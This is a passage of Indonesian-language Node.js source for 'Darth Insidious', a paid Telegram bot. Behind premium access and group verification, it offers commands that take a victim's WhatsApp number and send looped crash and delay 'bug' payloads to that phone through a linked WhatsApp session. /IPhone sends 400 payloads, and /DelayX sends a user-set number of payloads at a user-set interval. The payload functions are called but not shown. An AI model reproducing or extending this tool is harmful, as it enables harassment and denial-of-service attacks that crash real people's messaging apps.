// Fungsi simpan verified groups
function saveVerifiedGroups() {
  fs.writeFileSync(GROUP_FILE, JSON.stringify([...verifiedGroups], null, 2));
}

// ========== FUNGSI CEK OWNER (PERBAIKAN) ==========
function isOwner(userId) {
  // Jika OWNER_ID adalah array
  if (Array.isArray(OWNER_ID)) {
    return OWNER_ID.includes(userId.toString()) || OWNER_ID.includes(userId);
  }
  // Jika OWNER_ID adalah string/number
  return userId.toString() === OWNER_ID.toString();
}

// ========== COMMAND /addgroup (HANYA OWNER) ==========
bot.onText(/\/addgroup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  // CEK OWNER (PAKAI FUNGSI)
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ *Akses ditolak!* Hanya owner yang bisa menambahkan grup.", { parse_mode: "Markdown" });
  }
  
  // CEK APAKAH INI GRUP
  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, "❌ Command ini harus dijalankan di *GROUP*!", { parse_mode: "Markdown" });
  }
  
  const groupId = chatId;
  
  if (verifiedGroups.has(groupId)) {
    return bot.sendMessage(chatId, "✅ *Grup ini sudah terverifikasi!*", { parse_mode: "Markdown" });
  }
  
  verifiedGroups.add(groupId);
  saveVerifiedGroups();
  
  bot.sendMessage(chatId, 
    `✅ *GRUP BERHASIL DIVERIFIKASI!*\n\n` +
    `📌 Group ID: \`${groupId}\`\n` +
    `👑 Diverifikasi oleh: ${msg.from.username ? '@' + msg.from.username : 'Owner'}`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /delgroup (HAPUS GRUP DARI VERIFIKASI) ==========
bot.onText(/\/delgroup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  // CEK OWNER (PAKAI FUNGSI)
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ *Akses ditolak!* Hanya owner yang bisa menghapus verifikasi grup.", { parse_mode: "Markdown" });
  }
  
  // CEK APAKAH INI GRUP
  if (msg.chat.type === 'private') {
    return bot.sendMessage(chatId, "❌ Command ini harus dijalankan di *GROUP*!", { parse_mode: "Markdown" });
  }
  
  const groupId = chatId;
  
  if (!verifiedGroups.has(groupId)) {
    return bot.sendMessage(chatId, "❌ Grup ini belum terverifikasi.", { parse_mode: "Markdown" });
  }
  
  verifiedGroups.delete(groupId);
  saveVerifiedGroups();
  
  bot.sendMessage(chatId, 
    `❌ *GRUP DIHAPUS DARI VERIFIKASI!*\n\n` +
    `📌 Group ID: \`${groupId}\`\n` +
    `👑 Dihapus oleh: ${msg.from.username ? '@' + msg.from.username : 'Owner'}`,
    { parse_mode: "Markdown" }
  );
});

// ========== MODIFIKASI COMMAND /start (CEK GROUP VERIFIKASI) ==========
bot.onText(/^\/start(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputToken = match[1]?.trim();
  const groupId = msg.chat.id;

  if (SECURE_MODE) {
    return bot.sendMessage(chatId, "🔒 Akses telah terkunci.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "💢 Script Darth Insidious sedang dimatikan oleh Developer.");
  }

  // 🔥 CEK APAKAH GRUP SUDAH TERVERIFIKASI
  const isGroupVerified = verifiedGroups.has(groupId);
  
  // KALO GRUP SUDAH VERIFIKASI, LANGSUNG BERI AKSES TANPA TOKEN
  if (isGroupVerified && msg.chat.type !== 'private') {
    validatedUsers.add(chatId);
    console.log(`✅ Grup ${groupId} sudah terverifikasi, akses diberikan otomatis`);
    return bot.sendMessage(
      chatId,
      "🔓 *Grup Terverifikasi!*\nSilakan ketik /Insidious",
      { parse_mode: "Markdown" }
    );
  }

  // KALO DI PRIVATE ATAU GRUP BELUM VERIFIKASI, PAKE TOKEN
  if (!inputToken) {
    return bot.sendMessage(
      chatId,
      "🔏 Darth Insidious Protection Silahkan Ketik:\n\n`/start <token>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const resGithub = await axios.get(TOKEN_DATABASE, { timeout: 5000 });
    const validTokensGithub = resGithub.data.tokens || [];

    const cocokDenganConfig = inputToken === DARTH_TOKEN;
    const adaDiGithub = validTokensGithub.includes(inputToken);

    if (cocokDenganConfig && adaDiGithub) {
      validatedUsers.add(chatId);
      return bot.sendMessage(
        chatId,
        "🔓 Token valid!\nSilakan ketik /Insidious"
      );
    } else {
      return bot.sendMessage(chatId, "❌ Akses Terdeteksi.");
    }

  } catch (err) {
    console.error("⚠️ Error saat validasi token user:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal memeriksa token. Coba lagi nanti.");
  }
});

// ========== MODIFIKASI COMMAND /Insidious (CEK GROUP VERIFIKASI + GRATIS) ==========
bot.onText(/^\/Insidious(?:\s|@|$)/i, async (msg) => {
  console.log("💢 Command /Insidious diterima dari:", msg.from.username || msg.from.id);

  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const groupId = msg.chat.id;

  // 🔥 CEK GRUP VERIFIKASI
  const isGroupVerified = verifiedGroups.has(groupId);
  
  // KALO GRUP SUDAH VERIFIKASI, LANGSUNG BERI AKSES (GRATIS, TANPA PREMIUM)
  if (isGroupVerified && msg.chat.type !== 'private') {
    console.log(`✅ Grup ${groupId} terverifikasi, akses GRATIS diberikan otomatis`);
    // LANGSUNG KE MENU UTAMA (SKIP CEK TOKEN DAN PREMIUM)
  } 
  // KALO BELUM VERIFIKASI ATAU PRIVATE, CEK VALIDATED USERS DAN PREMIUM
  else if (!validatedUsers.has(chatId)) {
    console.log("💢 Diblok: Belum verifikasi token");
    return bot.sendMessage(
      chatId,
      "💢 Verifikasi Token.\nGunakan `/start <token>` terlebih dahulu.\n\n*Atau minta owner untuk meng-verify grup ini dengan /addgroup*",
      { parse_mode: "Markdown" }
    );
  }
  // KALO DI PRIVATE, TETAP HARUS PREMIUM
  else if (msg.chat.type === 'private') {
    const isPremium = premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    );
    
    if (!isPremium) {
      console.log("💢 Pengguna non-premium mencoba akses /Insidious di private chat");
      const randomImage = getRandomImage();
      const caption = `\`\`\`
「 💢 ディルガ 」\`\`\`
━━━━━━━━━━━━━━━━━━
ロー No Acces Premium
━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;

      return bot.sendPhoto(chatId, randomImage, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" },
              { text: "「 🍒 」", url: "https://t.me/testidilz21" },
            ],
          ],
        },
      });
    }
  }

  if (!BOT_ACTIVE) {
    console.log("💢 Bot sedang offline");
    return bot.sendMessage(
      chatId,
      `
<blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔏 Script Darth Insidious Sedang Offline..!
━━━━━━━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      { parse_mode: "HTML" }
    );
  }
  
  let groupOnlyData = { groupOnly: false };
  try {
    const raw = fs.readFileSync(ONLY_FILE, "utf8").trim();
    if (raw) groupOnlyData = JSON.parse(raw);
  } catch {
    groupOnlyData = { groupOnly: false };
  }

  if (groupOnlyData.groupOnly && msg.chat.type === "private") {
    console.log("💢 Bot hanya untuk grup");
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const randomImage = getRandomImage();
  const runtime = getBotRuntime();

  // Tampilkan loading hanya untuk user yang belum pernah load (opsional)
  const loadingFrames = [
    "🔄 Loading Darth Insidious [░░░░░░░░░░] 0%",
    "🔄 Loading Darth Insidious [▓░░░░░░░░░] 10%",
    "🔄 Loading Darth Insidious [▓▓░░░░░░░░] 20%",
    "🔄 Loading Darth Insidious [▓▓▓░░░░░░░] 30%",
    "🔄 Loading Darth Insidious [▓▓▓▓░░░░░░] 40%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓░░░░░] 50%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓░░░░] 60%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓░░░] 70%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓▓░░] 80%",
    "🔄 Loading Darth Insidious [▓▓▓▓▓▓▓▓▓░] 90%",
    "✅ Done! Launching Darth Insidious Interface...",
  ];

  const loadingMessage = await bot.sendMessage(chatId, loadingFrames[0]);
  for (let i = 1; i < loadingFrames.length; i++) {
    await new Promise((resolve) => setTimeout(resolve, 300));
    await bot.editMessageText(loadingFrames[i], {
      chat_id: chatId,
      message_id: loadingMessage.message_id,
    });
  }

  await new Promise((r) => setTimeout(r, 400));
  await bot.deleteMessage(chatId, loadingMessage.message_id);

  const caption = `\`\`\`
「 🍄 スクリプト 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
ロー 𝖠𝗎𝗍𝗁𝗈𝗋 : @dickxmod
ロー 𝖭𝖺𝗆𝖾 : Darth Insidious
ロー 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 5.0 PRO
ロー 𝖱𝗎𝗇𝗍𝗂𝗆𝖾 : ${runtime}
ロー 𝖯𝗋𝖾𝖿𝗂𝗑 : (/)
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 アクセスのみ 」\`\`\`
お /addprem -ID-
お /delprem -ID-
お /addadmin -ID-
お /deladmin -ID-
お /setcd - Time
お /addgroup - Group 
お /delgroup - Group 
お /gconly - on - off
お /addbot - Number
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;

  const buttons = {
    inline_keyboard: [
      [
        { text: "「 🍓 」", callback_data: "bugshow" },
        { text: "「 𝖮-𝖧𝖾𝗅𝗉 」", callback_data: "help" },
        { text: "「 ツール 」", callback_data: "tools" },
      ],
      [{ text: "「 グループ  」", callback_data: "groupmenu" }],
      [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }],
    ],
  };

  console.log("💢 Menu utama dikirim setelah loading selesai");
  return bot.sendPhoto(chatId, randomImage, {
    caption,
    parse_mode: "Markdown",
    reply_markup: buttons,
  });
});
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;
  const randomImage = getRandomImage();
  const runtime = getBotRuntime();
  let newCaption, newButtons;

  // Di sini letak kode switch kamu yang asli
  switch (data) {
  
    case "bugshow":
      newCaption = `\`\`\`
「 🍄 フローバグ 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
お /DelayX - 62xxx
お /IPhone - 62xxx
お /Screen - 62xxx
お /Visible - 62xxx
お /CrashUi - 62xxx
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 オーナー 」\`\`\`
\`\`\`
ɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ ʏᴀɴɢ ᴛᴇʀsᴇᴅɪᴀ ᴅɪ ᴀᴛᴀs
ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴇʀʟᴇʙɪʜᴀɴ, ᴊɪᴋᴀ sᴘᴀᴍ
ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴɢᴀʟᴀᴍɪ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴄʟᴏsᴇᴅ
ᴘᴀᴅᴀ sᴇʙᴜᴀʜ sᴇɴᴅᴇʀ, ᴊᴀᴅɪ ᴍᴏʜᴏɴ ᴅɪ ʙᴀᴄᴀ
ᴅᴇɴɢᴀɴ ʙᴀɪᴋ, sᴇʙᴇʟᴜᴍ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ!!
\`\`\`
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;
      
    case "tools":
      newCaption = `\`\`\`
「 🍄 フローツール 」\`\`\`
━━━━━━━━━━━━━━━━━━
お /DarthIP - Tracking IP
お /Tiktok - Url
お /Getcode - Url
お /Instagram - Url
お /testfunction - Test Function
お /IPhoneQ - Teks
お /spotify - Search Lagu
お /Tourl - Foto - Video
お /brat - Teks
お /tofile - File
お /open - File
━━━━━━━━━━━━━━━━━━
`;
      newButtons = [
        //[{ text: "「 𝖥𝗈𝗋𝖸𝗈𝗎 」", callback_data: "You" }],
        [{ text: "🔙 Kembali", callback_data: "mainmenu" }]
      ];
      break;
     
               case "groupmenu":
      newCaption = `\`\`\`
「 🍄 グループメニュー 」\`\`\`

⎈ FITURE GROUP
├⟣ /info
│╰ ɪɴꜰᴏ ᴜꜱᴇʀ
├⟣ /promote
│╰ ᴊᴀᴅɪᴋᴀɴ ᴀᴅᴍɪɴ ᴅɪ ɢʀᴏᴜᴘ
├⟣ /demote
│╰ ᴅᴇʟᴇᴛᴇ ᴀᴅᴍɪɴ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /ban
│╰ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ 
├⟣ /unban
│╰ ᴜɴʙᴀɴ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /opengb 
│╰  ᴍᴇᴍʙᴜᴋᴀ ᴄʜᴀᴛ ɢʀᴏᴜᴘ
├⟣ /closegb 
│╰  ᴍᴇɴᴜᴛᴜᴘ ᴄʜᴀᴛ ɢʀᴏᴜᴘ
├⟣ /mute
│╰ ᴍᴜᴛᴇ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /unmute
│╰ ʙᴜᴋᴀ ᴍᴜᴛᴇ ᴜsᴇʀ ᴅᴀʀɪ ɢʀᴏᴜᴘ
├⟣ /antiforward
│╰ ᴀɴᴛɪ ꜰᴏʀᴡᴀʀᴅ ɢʀᴏᴜᴘ
├⟣ /antilink
│╰ ᴀɴᴛɪʟɪɴᴋ ɢʀᴏᴜᴘ
├⟣ /antipromosi
│╰ ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ
├⟣  /addantipromosi
│╰ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ʟɪsᴛ ʙʟᴏᴄᴋʟɪsᴛ
├⟣ /listblocklist
│╰ ᴍᴇʟɪʜᴀᴛ ᴅᴀғᴛᴀʀ ʙʟᴏᴄᴋʟɪsᴛ
╰────────────────────────────
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;
     
     
    case "You":
      newCaption = `\`\`\`
「 🍄 アシスタント 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 𝖧𝖺𝗅𝗅𝗈 𝖫𝗈𝗅𝗂𝗉𝗈𝗉 𝖬𝖾𝗇𝗒𝖾𝖽𝗂𝖺𝗄𝖺𝗇!! 」\`\`\`
ロー 𝖯𝖺𝗋𝗍𝗇𝖾𝗋 𝖵𝗏𝗂𝗉 : 30.000
ロー 𝖦𝖾𝗍 𝖡𝖺𝗌𝖾 𝖯𝗋𝗂𝗏𝖺𝗍𝖾
ロー 𝖦𝖾𝗍 𝖲𝖼𝗋𝗂𝗉𝗍 𝖳𝗂𝗍𝗅𝖾 𝖯𝖺𝗋𝗍𝗇𝖾𝗋
ロー 𝖦𝖾𝗍 𝖲𝗈𝗎𝗋𝖼𝖾 𝖪𝗈𝖽𝖾 𝖧𝗍𝗆𝗅 𝖶𝖾𝖻 𝖲𝗍𝗈𝗋𝖾
ロー 𝖦𝖾𝗍 𝖠𝖽𝖽 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇
ロー 𝖦𝖾𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 𝖯𝗋𝗂𝗏𝖺𝗍𝖾
ロー 𝖦𝖾𝗍 𝖱𝖾𝗌𝖾𝗅𝗅𝖾𝗋 𝖷7-𝖫𝗈𝗅𝗂𝗉𝗈𝗉
ロー 𝖦𝖾𝗍 𝖯𝖺𝗋𝗍𝗇𝖾𝗋 𝖮𝗏𝖾𝗋𝖥𝗅𝗈𝗐𝖷
ロー 𝖦𝖾𝗍 𝖱𝖾𝗌𝖾𝗅𝗅𝖾𝗋 𝖲𝖼𝗋𝗂𝗉𝗍 𝖣𝖾𝗇𝖽𝖾𝗅𝗂𝗈𝗇
ロー 𝖣𝖺𝗇 𝖫𝖺𝗂𝗇 - 𝖫𝖺𝗂𝗇 𝖬𝖺𝗌𝗂𝗁 𝖡𝖺𝗇𝗒𝖺𝗄!!
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 Payment Tersedia 」\`\`\`
タ Dana - No Premium
タ Gopay - No Premium
タ Ovo - Premium Active
タ Ready Qris - All Opsi
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 𝖧𝖺𝗋𝗀𝖺 𝖲𝖼𝗋𝗂𝗉𝗍 Darth Insidious 」\`\`\`
ロー Script No Update : Rp20.000
ロー Script Full Update : Rp45.000
ロー Script Reseller : Rp50.000
ロー Script Partner : Rp60.000
ロー Script To Moderator : Rp70.000
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 𝖭𝗈𝗍𝗂𝖿𝗂𝗄𝖺𝗌𝗂 𝖡𝗎𝗍𝗍𝗈𝗇 𝖮-𝖧𝖾𝗅𝗉 」\`\`\`
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "tools" }]
      ];
      break;
     
    case "help":
      newCaption = `\`\`\`
「 🍄 𝖧𝖾𝗅𝗉 」\`\`\`
\`\`\`
注文 :\`\`\`
🂱 /Notif - Owner
\`\`\`
注記 :
ᴜɴᴛᴜᴋ ᴘᴇɴɢɢᴜɴᴀ sᴄʀɪᴘᴛ ɪɴɪ
ᴍᴏʜᴏɴ ɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ ɪɴɪ ᴋᴇᴘᴀᴅᴀ
ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇʀᴍᴀsᴀʟᴀʜ,
ᴊᴀɴɢᴀɴ ᴋᴀᴍᴜ sᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ..!!
\`\`\`
`;

      newButtons = [
        //[{ text: "「 𝖠𝗌𝗂𝗌𝗍𝖾𝗇 」", callback_data: "asisten" }],
        [{ text: "🔙 Kembali", callback_data: "mainmenu" }]
      ];
      break;

    case "asisten":
      newCaption = `\`\`\`
「 🍄 アシスタント 」\`\`\`
\`\`\`
注文 :\`\`\`
お /Darth - Teks
お /reset - Reset Chat Asisten
お /asistenoff - Matikan Asisten
お /asistenon - Menyalakan Asisten
\`\`\`
注記 : 
sᴄʀɪᴘᴛ ɪɴɪ ᴍᴀsɪʜ ᴛᴀʜᴀᴘ ᴘᴇɴɢᴇᴍʙᴀɴɢᴀɴ
ᴊᴀᴅɪ ᴍᴏʜᴏɴ ᴍᴀᴀғ ᴊɪᴋᴀ ᴀᴅᴀ ᴘᴇʀᴍᴀsᴀʟᴀʜᴀɴ
ᴘᴀᴅᴀ sᴄʀɪᴘᴛ ɪɴɪ, sᴇᴍᴏɢᴀ ᴋᴇᴅᴇᴘᴀɴɴʏᴀ ʟᴇʙɪʜ
ʙᴀɢᴜs ᴅᴀɴ ᴋᴜᴀʟɪᴛᴀs ᴛᴇʀᴊᴀɢᴀ ᴀᴍᴀɴ..!!
\`\`\`
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "help" }]
      ];
      break;
     
    case "mainmenu":
      newCaption = `\`\`\`
「 🍄 スクリプト 」\`\`\`
━━━━━━━━━━━━━━━━━━━━━━━━━━
ロー 𝖠𝗎𝗍𝗁𝗈𝗋 : @dickxmod
ロー 𝖭𝖺𝗆𝖾 : Darth Insidious
ロー 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 5.0 PRO
ロー 𝖱𝗎𝗇𝗍𝗂𝗆𝖾 : ${runtime}
ロー 𝖯𝗋𝖾𝖿𝗂𝗑 : (/)
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 アクセスのみ 」\`\`\`
お /addprem -ID-
お /delprem -ID-
お /addadmin -ID-
お /deladmin -ID-
お /setcd - Time
お /addgroup - Group 
お /delgroup - Group 
お /gconly - on - off
お /addbot - Number
━━━━━━━━━━━━━━━━━━━━━━━━━━\`\`\`
の Dilz No Mercy\`\`\`
`;
      newButtons = [
        [
          { text: "「 🍓 」", callback_data: "bugshow" },
          { text: "「 𝖮-𝖧𝖾𝗅𝗉 」", callback_data: "help" },
          { text: "「 ツール 」", callback_data: "tools" }
        ],
        [{ text: "「 グループ  」", callback_data: "groupmenu" }],
        [
          { text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }
        ]
      ];
      break;
  }

  try {
    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: newCaption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: newButtons }
      }
    );
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      await bot.answerCallbackQuery(query.id, {
        text: "⚠️ Anda Sudah Di Menu Ini",
        show_alert: false
      });
    } else {
      console.error("❌ Gagal edit media:", err);
    }
  }

  await bot.answerCallbackQuery(query.id);
});



///----------( Function Detect Premium )----------\\\
const isPremiumUser = (id) => premiumUsers.some(u => u.id.toString() === id.toString());



///----------( Function Loading )----------\\\
function generateProgressBar(percent, length = 20) {
  const filledLength = Math.round((percent / 100) * length);
  const emptyLength = length - filledLength;
  return "█".repeat(filledLength) + "░".repeat(emptyLength) + ` ${percent}%`;
}



///-----------( Function Admin Group )----------\\\
async function isBotAdmin(chatId) {
  try {
    const botMember = await bot.getChatMember(chatId, (await bot.getMe()).id);
    return ["administrator", "creator"].includes(botMember.status);
  } catch (err) {
    console.error("Gagal cek admin bot:", err);
    return false;
  }
}



///----------( Function MarkdownV2 )-----------\\\
function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}



///----------( Function Markdown )----------\\\
function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*`\[])/g, "\\$1");
}



///----------( The Setcd )----------\\\
bot.onText(/^\/setcd\s+(.+)/i, async (msg, match) => {
  console.log("Command /setcd diterima:", msg.text);

  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!config.OWNER_ID.map(Number).includes(fromId)) {
      console.log("Bukan owner:", fromId);
      return bot.sendMessage(chatId, "❌ Owner Only!");
  }

  const timeString = match[1]?.trim();
  if (!timeString) return bot.sendMessage(chatId, '⚠ Format salah! Gunakan: /setcd <detik>');

  const processingMsg = await bot.sendMessage(chatId, '⏳ Mengatur cooldown...');

  try {
    const result = setCooldown(timeString);
    await bot.editMessageText(`🍂 Cooldown berhasil diatur!\n${result}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  } catch (error) {
    console.error('❌ Error setcd:', error.message);
    await bot.editMessageText('❌ Gagal mengatur cooldown. Coba lagi nanti!', {
      chat_id: chatId,
      message_id: processingMsg.message_id
    });
  }
});




///----------( The Bug )----------\\\
bot.onText(/\/IPhone(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/IPhone 62xxxxxxxxxx\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n\n` +
      `Contoh lain:\n\`\`\`\n/IPhone 6281234567890\n\`\`\`\n` +
      `💢 Akses Terkirim!!.`,
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = args.trim();
  if (!/^\d+$/.test(targetNumber)) {
    return bot.sendMessage(chatId, "⚠️ Format salah!\nContoh: `/IPhone 6281234567890`", {
      parse_mode: "Markdown",
    });
  }

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const randomImage = getRandomImage();
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
💢 Hei Premium Only!
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }]
        ]
      }
    });
  }

  const remaining = checkCooldown(userId);
  if (remaining > 0) {
    return bot.sendMessage(chatId, `⏱️ Tunggu ${remaining} detik lagi!`);
  } else {
    bot.sendMessage(chatId, "💢 Aksi berhasil, cooldown dimulai!");
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "⚠️ Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhone
𖥂 Status : 💢 Mengirim Santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < 200; i++) {
      await exoticsIP(Dilz, target);
      await new Promise(res => setTimeout(res, 500));
      await exoticsIP(Dilz, target);
      await new Promise(res => setTimeout(res, 500));
    }

    console.log(chalk.red(`Succes Sending Bug`));

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhone
𖥂 Status : Succesfuly Sending Bug
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 」", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Screen Error:", err);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

bot.onText(/\/DelayX(?:\s*(.*))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1];

  if (!args) {
    return bot.sendMessage(
      chatId,
      `💢 *Contoh penggunaan yang benar:*` +
      `\`\`\`\n/DelayX 62xxxxxxxxxx,1000,500\n\`\`\`\n` +
      `🍂 *Keterangan:*\n` +
      `- 62xxxxxxxxxx → Nomor target WhatsApp\n` +
      `- 1000 → Jumlah pengiriman (loop)\n` +
      `- 500 → Jeda antar kirim (dalam milidetik / ms)\n\n` +
      `Contoh lain:\n\`\`\`\n/DelayX 6281234567890,5000,100\n\`\`\`\n` +
      `💢 Mengirim 5000 kali dengan jeda 100ms`,
      { parse_mode: "Markdown" }
    );
  }

  const parts = args.split(",");
  if (parts.length < 3) {
    return bot.sendMessage(chatId, "⚠️ Format salah! Gunakan format: `/DelayX nomor,loop,delay`\nContoh: `/DelayX 6281234567890,100,200`", {
      parse_mode: "Markdown"
    });
  }

  const [targetNumber, totalLoopRaw, delayTimeRaw] = parts;
  const totalLoop = parseInt(totalLoopRaw);
  const delayTime = parseInt(delayTimeRaw);

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Mode : Delay Custom
𖥂 Loop : ${totalLoop}x
𖥂 Delay : ${delayTime}ms
𖥂 Status : 💢 Mengirim santet...
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 User : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
    parse_mode: "Markdown"
  });

  try {
    for (let i = 0; i < totalLoop; i++) {
      await delay1(Dilz, target, false);
      await delay2(Dilz, target, false);
      await delay3(Dilz, target, false);
      await ExocistGodDelay(target, false);
      await Permen(Dilz, target);
      await new Promise(res => setTimeout(res, delayTime));
    }

    await bot.editMessageCaption(`\`\`\`
「 🍒 Darth Insidious 」
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Mode : DelayX
𖥂 Loop : ${totalLoop}x
𖥂 Delay : ${delayTime}ms
𖥂 Status : Sukses mengirim ${totalLoop}x!
𖥂 Date : ${date}
𖥂 Time : ${runtime}
𖥂 User : ${username}
━━━━━━━━━━━━━━━━━━
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "「 WhatsApp 」", url: `https://wa.me/${formattedNumber}` }]]
        }
      }
    );

